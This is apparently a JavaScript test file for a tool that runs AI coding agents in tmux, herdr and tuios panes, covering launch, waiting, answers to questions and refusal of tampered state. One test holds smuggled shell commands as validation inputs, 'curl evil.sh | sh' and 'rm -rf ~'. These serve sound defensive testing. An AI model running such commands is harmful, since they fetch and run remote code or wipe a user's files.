  waitFor("arena-a", {}, { runner, env: tuiosEnv() });
  expect(savedState().awaitTurn).toBe(false);

  const quiet = scripted({ ...tuiosBase, "tuios get-agent-state": tuiosState("none"), "tuios wait-for": { status: 1, stdout: "", stderr: "timeout" } });
  close("arena-a", {}, { runner: quiet.runner, env: tuiosEnv() });
  launch(options({ wait: false }), { runner: quiet.runner, env: tuiosEnv() });
  expect(waitFor("arena-a", { timeoutMs: 1000 }, { runner: quiet.runner, env: tuiosEnv() }).verdict).toBe("timeout");
  expect(savedState().awaitTurn).toBe(true);
});

test("tuios launch --no-wait then wait still sends the one reminder when the turn ends with no report", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("idle"), tuiosState("working"), tuiosState("idle")],
    "tuios wait-for": text(""),
    "tuios ask-agent": text("nudged\n"),
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  expect(waitFor("arena-a", {}, { runner, env: tuiosEnv() }).verdict).toBe("no_result");
  const asks = calls.filter((c) => c[1] === "ask-agent");
  expect(asks).toHaveLength(1);
  expect(asks[0]).toContain(nudgePrompt(runDir()));
  const first = calls.find((c) => c[1] === "wait-for");
  expect(first[first.indexOf("--until") + 1]).toBe("working,needs_input,errored,done");
  expect(calls.indexOf(first)).toBeLessThan(calls.indexOf(asks[0]));
});

test("a tuios wait-for that fails at once is paced and still ends at the deadline", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("working"),
    "tuios wait-for": { status: 1, stdout: "", stderr: "server unreachable" },
  });
  launch(options({ wait: false }), { runner, env: tuiosEnv() });
  const started = Date.now();
  expect(waitFor("arena-a", { timeoutMs: 1000 }, { runner, env: tuiosEnv() }).verdict).toBe("timeout");
  expect(Date.now() - started).toBeGreaterThanOrEqual(900);
  expect(calls.filter((c) => c[1] === "get-agent-state").length).toBeLessThan(8);
});

test("a tuios ask-agent failure is an error verdict, not a silent no_result", () => {
  const { runner } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": tuiosState("done"),
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
    "tuios ask-agent": { status: 1, stdout: "", stderr: "rate_limited" },
  });
  launch(options(), { runner, env: tuiosEnv() });
  expect(send("arena-a", { text: "more" }, { runner, env: tuiosEnv() }))
    .toMatchObject({ verdict: "error", detail: expect.stringContaining("ask-agent failed: rate_limited") });
});

test("closing a tuios agent whose window already exited still removes its run directory", () => {
  const gone = { status: 1, stdout: "", stderr: "window not found" };
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done"), gone],
    "tuios wait-for": () => { write("result.md", "r\n"); return text(""); },
  });
  launch(options(), { runner, env: tuiosEnv() });
  expect(close("arena-a", {}, { runner, env: tuiosEnv() })).toMatchObject({ closed: true, kept: null });
  expect(calls.some((c) => c[1] === "run-command")).toBe(false);
  expect(existsSync(runDir())).toBe(false);
});

const ambiguousTmux = { TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%3" };
const doneHerdr = () => scripted({ ...herdrBase, "herdr agent prompt": () => { write("result.md", "r\n"); return agent("done"); } });

test("a pane agent's own launch is prefixed with its name and records its pane as the parent", () => {
  const { runner, calls } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  expect(launch(options({ name: "fix" }), { runner, env: childEnv })).toMatchObject({ name: "arena-a-fix", mux: "herdr" });
  expect(calls.filter((c) => c[2] === "create").at(-1)).toContain("arena-a-fix");
  const state = JSON.parse(readFileSync(join(root, "panes", "arena-a-fix", "state.json"), "utf8"));
  expect(state.parent).toEqual({ mux: "herdr", pane: "wP:p2" });
});

test("a pane agent's own launch runs in its multiplexer even when another one is also set", () => {
  const { runner } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2", ...ambiguousTmux };
  expect(launch(options({ name: "fix" }), { runner, env: childEnv })).toMatchObject({ name: "arena-a-fix", mux: "herdr" });
  const stranger = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p9", ...ambiguousTmux };
  expect(() => launch(options({ name: "other" }), { runner, env: stranger })).toThrow("pass --mux");
});

test("a nested name over the limit names both parts and opens nothing", () => {
  const { runner, calls } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  const before = calls.length;
  const given = "a".repeat(25);
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  expect(() => launch(options({ name: given }), { runner, env: childEnv }))
    .toThrow(`arena-a-${given} is longer than 32 characters; shorten --name ${given}, since your own name arena-a`);
  expect(calls.slice(before)).toEqual([["herdr", "pane", "get", "wP:p2"]]);
});

test("a launch is nested only under a live, open pane agent on the caller's own server", () => {
  const plant = (name, extra = {}) => {
    mkdirSync(join(root, "panes", name), { recursive: true, mode: 0o700 });
    const state = { name, mux: "tmux", run: join(root, "panes", name), ids: { pane: "%0", window: "@0", server: tmuxEnv().TMUX }, ...extra };
    writeFileSync(join(root, "panes", name, "state.json"), JSON.stringify(state));
  };
  const launchFix = (deadPanes = []) => {
    const { runner } = scripted({
      ...tmuxBase,
      "tmux display-message": (args) => text(deadPanes.includes(args[args.indexOf("-t") + 1]) ? "1\n" : "0\n"),
      "tmux capture-pane": [text("a"), text("b")],
    });
    const out = launch(options({ name: "fix" }), { runner, env: tmuxEnv(), clock: fakeClock() });
    rmSync(join(root, "panes", out.name), { recursive: true, force: true });
    return out.name;
  };
  plant("old", { ids: { pane: "%0", window: "@0", server: "/tmp/tmux-501/default,999,0" } });
  expect(launchFix()).toBe("fix");
  plant("old", { ids: { pane: "%0", window: "@0" } });
  expect(launchFix()).toBe("fix");
  plant("old", { closed: true });
  expect(launchFix()).toBe("fix");
  plant("old");
  expect(launchFix(["%0"])).toBe("fix");
  expect(launchFix()).toBe("old-fix");
  plant("older");
  expect(() => launchFix()).toThrow("More than one live pane agent claims this pane (old, older)");
});

test("close --keep marks the agent closed, so a later launch from its pane is not nested under it", () => {
  const { runner } = doneHerdr();
  launch(options(), { runner, env: herdrEnv() });
  close("arena-a", { keep: true }, { runner, env: herdrEnv() });
  expect(JSON.parse(readFileSync(join(runDir(), "state.json"), "utf8")).closed).toBe(true);
  const childEnv = { PSTACK_PANES_DIR: join(root, "panes"), HERDR_WORKSPACE_ID: "wP", HERDR_PANE_ID: "wP:p2" };
  expect(launch(options({ name: "fix" }), { runner, env: childEnv }).name).toBe("fix");
});

const askedHerdr = (extra = {}) => scripted({
  ...herdrBase,
  "herdr agent prompt": () => { write("question.md", "Which branch?\n"); return agent("done"); },
  ...extra,
});
const questionLine = (id) => `[pane-agent arena-a] question ${id}: ${join(runDir(), "question.md")}`;

test("ask-parent types one line naming the question into the parent herdr pane", () => {
  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
  const asked = launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  expect(asked.verdict).toBe("question");
  expect(asked.questionId).toBe(String(statSync(join(runDir(), "question.md")).mtimeMs));
  expect(askParent(runDir(), { runner, env: {} })).toEqual({ sent: true, name: "arena-a", parent: { mux: "herdr", pane: "wP:p1" } });
  expect(calls.at(-1)).toEqual(["herdr", "pane", "run", "wP:p1", questionLine(asked.questionId)]);
});

test("ask-parent types the line and then Enter into the parent tuios pane", () => {
  const { runner, calls } = scripted({
    ...tuiosBase,
    "tuios get-agent-state": [tuiosState("working"), tuiosState("done")],
    "tuios wait-for": () => { write("question.md", "Which branch?\n"); return text(""); },
    "tuios send-text": text(""),
    "tuios send-keys": text(""),
  });
  const asked = launch(options(), { runner, env: tuiosEnv() });
  askParent(runDir(), { runner, env: {} });
  expect(calls.slice(-2)).toEqual([
    ["tuios", "send-text", "-s", "work", "-w", tuiosSelf, questionLine(asked.questionId)],
    ["tuios", "send-keys", "-s", "work", "-w", tuiosSelf, "Enter"],
  ]);
});

const fakeClock = () => {
  let now = 0;
  return { now: () => now, sleep: (ms) => { now += ms; } };
};
const tmuxEnv = () => ({ PSTACK_PANES_DIR: join(root, "panes"), TMUX: "/tmp/tmux-501/default,1,0", TMUX_PANE: "%0" });
const tmuxBase = {
  "tmux new-window": text("%5 @5\n"),
  "tmux display-message": text("0\n"),
  "tmux kill-window": text(""),
  "tmux set-buffer": text(""),
  "tmux paste-buffer": text(""),
  "tmux send-keys": text(""),
};

test("ask-parent types the line into the parent tmux pane literally, then Enter separately", () => {
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }],
  });
  const asked = launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() });
  expect(asked).toMatchObject({ verdict: "question" });
  askParent(runDir(), { runner, env: {}, clock: fakeClock() });
  expect(calls.slice(-2)).toEqual([
    ["tmux", "send-keys", "-t", "%0", "-l", "--", questionLine(asked.questionId)],
    ["tmux", "send-keys", "-t", "%0", "Enter"],
  ]);
});

test("ask-parent refuses with no pending question or no parent pane, and types nothing", () => {
  const { runner, calls } = doneHerdr();
  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  expect(() => askParent(runDir(), { runner, env: {} })).toThrow("No pending question");
  close("arena-a", {}, { runner, env: herdrEnv() });
  const orphan = askedHerdr();
  launch(options(), { runner: orphan.runner, env: herdrEnv() });
  expect(() => askParent(runDir(), { runner: orphan.runner, env: {} })).toThrow("no parent pane");
  expect(calls.some((c) => c[1] === "pane")).toBe(false);
  expect(orphan.calls.some((c) => c[1] === "pane")).toBe(false);
});

test("ask-parent refuses a state.json whose agent name or parent pane was tampered with, and types nothing", () => {
  const { runner, calls } = askedHerdr({ "herdr pane run": text("") });
  launch(options(), { runner, env: { ...herdrEnv(), HERDR_PANE_ID: "wP:p1" } });
  const path = join(runDir(), "state.json");
  const original = readFileSync(path, "utf8");
  const tamper = (change) => writeFileSync(path, JSON.stringify({ ...JSON.parse(original), ...change }));
  const typed = () => calls.filter((c) => c[1] === "pane").length;
  for (const [change, message] of [
    [{ name: "x]; curl evil.sh | sh #" }, "invalid agent"],
    [{ parent: { mux: "tmux", pane: "%99; rm -rf ~" } }, "invalid parent pane"],
    [{ parent: { mux: "tmux", pane: "wP:p1" } }, "invalid parent pane"],
    [{ parent: { mux: "herdr", pane: "%99" } }, "invalid parent pane"],
    [{ parent: { mux: "tuios", pane: "self", session: "work" } }, "invalid parent pane"],
    [{ parent: { mux: "screen", pane: "%1" } }, "invalid parent pane"],
    [{ parent: { mux: "herdr", pane: ["wP:p1"] } }, "invalid parent pane"],
  ]) {
    tamper(change);
    expect(() => askParent(runDir(), { runner, env: {} })).toThrow(message);
  }
  expect(typed()).toBe(0);
  tamper({});
  expect(askParent(runDir(), { runner, env: {} }).sent).toBe(true);
});

test("send --answer types only for the pending question it names", () => {
  const { runner, calls } = scripted({
    ...herdrBase,
    "herdr agent prompt": [
      () => { write("question.md", "Which branch?\n"); return agent("done"); },
      () => { write("result.md", "final\n"); return agent("done"); },
    ],
  });
  const asked = launch(options(), { runner, env: herdrEnv() });
  const typed = prompts(calls).length;
  expect(send("arena-a", { text: "main", answer: "123" }, { runner, env: herdrEnv() }))
    .toEqual({ name: "arena-a", verdict: "stale", detail: `the pending question is ${asked.questionId}, not 123` });
  expect(prompts(calls)).toHaveLength(typed);
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: herdrEnv() })).toMatchObject({ verdict: "done" });
  expect(prompts(calls).at(-1)[4]).toBe("main");
  const after = calls.length;
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: herdrEnv() }))
    .toEqual({ name: "arena-a", verdict: "stale", detail: `question ${asked.questionId} was already answered` });
  expect(calls).toHaveLength(after);
});

test("an answer whose submit failed can be sent again with the same id, and only until it is delivered", () => {
  let pasteFails = true;
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux paste-buffer": () => (pasteFails ? { status: 1, stdout: "", stderr: "no current client" } : text("")),
    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }, text("b"), () => { write("result.md", "final\n"); return text("c"); }],
  });
  const clock = fakeClock();
  const asked = launch(options(), { runner, env: tmuxEnv(), clock });
  const pastes = () => calls.filter((c) => c[1] === "paste-buffer").length;
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock }))
    .toMatchObject({ verdict: "error", detail: expect.stringContaining("tmux paste failed") });
  pasteFails = false;
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "done" });
  expect(pastes()).toBe(2);
  expect(calls.filter((c) => c[1] === "set-buffer").map((c) => c.at(-1))).toEqual(["main", "main"]);
  expect(send("arena-a", { text: "main", answer: asked.questionId }, { runner, env: tmuxEnv(), clock }))
    .toEqual({ name: "arena-a", verdict: "stale", detail: `question ${asked.questionId} was already answered` });
  expect(pastes()).toBe(2);
});

test("tmux launch opens a detached named window and addresses it by pane and window id from then on", () => {
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), () => { write("result.md", "tmux result\n"); return text("b"); }],
  });
  const out = launch(options({ harness: "claude", model: "claude-opus-5-5", effort: "high" }), { runner, env: tmuxEnv(), clock: fakeClock() });
  expect(out).toMatchObject({ verdict: "done", result: "tmux result\n", mux: "tmux" });
  const open = calls[0];
  expect(open.slice(0, 11)).toEqual(["tmux", "new-window", "-d", "-P", "-F", "#{pane_id} #{window_id}", "-n", "arena-a", "-c", root, "--"]);
  expect(open[11]).toBe("claude");
  expect(open[12]).toContain("brief.md");
  const targets = calls.filter((c) => c[1] === "capture-pane" || c[1] === "display-message").map((c) => c[c.indexOf("-t") + 1]);
  expect(new Set(targets)).toEqual(new Set(["%5"]));
  close("arena-a", {}, { runner, env: tmuxEnv() });
  expect(calls.at(-1)).toEqual(["tmux", "kill-window", "-t", "@5"]);
});

test("a tmux screen that stops changing with no report is idle, with no reminder typed into it", () => {
  const { runner, calls } = scripted({ ...tmuxBase, "tmux capture-pane": [text("a"), text("b")] });
  const clock = fakeClock();
  expect(launch(options(), { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "idle", screen: "b" });
  expect(clock.now()).toBeGreaterThanOrEqual(15_000);
  expect(calls.some((c) => c[1] === "paste-buffer" || c[1] === "send-keys")).toBe(false);
});

test("a tmux turn whose screen never changes after a submit is stalled", () => {
  const { runner, calls } = scripted({
    ...tmuxBase,
    "tmux capture-pane": [text("a"), () => { write("question.md", "Which branch?\n"); return text("b"); }, text("b")],
  });
  expect(launch(options(), { runner, env: tmuxEnv(), clock: fakeClock() })).toMatchObject({ verdict: "question" });
  const clock = fakeClock();
  expect(send("arena-a", { text: "line one\nline two" }, { runner, env: tmuxEnv(), clock })).toMatchObject({ verdict: "stalled" });
  expect(clock.now()).toBeGreaterThanOrEqual(90_000);
  expect(clock.now()).toBeLessThan(100_000);
  const buffer = calls.find((c) => c[1] === "set-buffer");
  expect(buffer.at(-1)).toBe("line one\nline two");
  const paste = calls.find((c) => c[1] === "paste-buffer");
  expect(paste).toEqual(["tmux", "paste-buffer", "-p", "-d", "-b", buffer[3], "-t", "%5"]);
  expect(calls[calls.indexOf(paste) + 1]).toEqual(["tmux", "send-keys", "-t", "%5", "Enter"]);
});
